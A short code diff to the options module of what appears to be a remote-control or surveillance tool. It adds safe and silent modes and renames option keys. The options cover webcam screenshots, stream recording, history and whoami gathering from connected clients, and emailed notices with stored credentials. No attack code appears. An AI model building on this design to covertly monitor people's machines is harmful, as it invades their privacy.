@@ -6,10 +6,10 @@ from domestic.global_state import *
 
 options_list = (
   (
-  'validation/terminal-timeout',
+  'mode/safe',
+  'mode/silent',
   'validation/duplicates',
   'validation/max-clients',
-  'information-gathering/silent',
   'information-gathering/history',
   'information-gathering/whoami',
   'information-gathering/record/stream',
@@ -20,16 +20,16 @@ options_list = (
   'information-gathering/save/cam-screenshot',
   'information-gathering/backup/text',
   'information-gathering/backup/image',
-  'notices/email-notice',
-  'notices/email-data/email',
-  'notices/email-data/password',
-  'notices/email-data/to'
+  'notice/email-notice',
+  'notice/email-data/email',
+  'notice/email-data/password',
+  'notice/email-data/to'
   ),
   (
     'bool',
     'bool',
-    'int',
     'bool',
+    'int',
     'bool',
     'bool',
     'bool',
@@ -72,7 +72,7 @@ def options(message):
     status_message(f'Option: {key} is now set to {value}', 'success')
   elif available:
     options = state['options']
-    categories = ['validation', 'information-gathering', 'notices']
+    categories = ['mode', 'validation', 'information-gathering', 'notice']
 
     for categorie in categories:
       option_category = options[categorie]
